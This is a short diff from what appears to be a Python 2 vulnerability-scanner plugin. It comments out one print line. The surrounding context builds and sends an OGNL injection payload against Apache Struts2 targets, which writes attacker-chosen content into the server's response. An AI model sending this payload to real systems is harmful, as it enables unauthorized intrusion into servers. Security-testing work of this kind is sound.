@@ -30,7 +30,7 @@ class P(T):
                   "s.rpsobj[0]].getWriter().println(%23parameters.content[0]):" \
                   "xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher." \
                   "HttpServletResponse&content={content}".format(url=target_url, content=content)
-        print target_url
+        #print target_url
         try:
             res=urllib2.urlopen(poc_url,timeout=timeout)
             res_html = res.read()
